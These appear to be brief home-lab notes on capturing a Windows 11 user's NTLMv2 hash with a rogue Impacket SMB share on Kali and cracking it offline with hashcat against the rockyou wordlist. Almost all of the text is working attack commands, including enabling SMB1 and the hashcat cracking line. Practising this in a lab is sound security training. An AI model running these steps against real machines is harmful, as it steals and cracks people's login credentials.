# Steps:
1. In Win11 `Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -All`.
1. In Kali `sudo mkdir /tmp/fakeshare`.
1. In Kali `python3 /usr/share/doc/python3-impacket/examples/smbserver.py SHARE /tmp/fakeshare -smb2support`.
1. In Win11, browse `\\192.168.8.10\SHARE` in file explorer.
1. In Kali `Save the captured NTLMv2 authentication hash into ~/Desktop/ntlmv2.hash`.
1. In Kali `hashcat -m 5600 ~/Desktop/ntlmv2.hash /usr/share/wordlists/rockyou.txt`.

# Results
The result will be listed as Candidates.#1....: Password -> Password


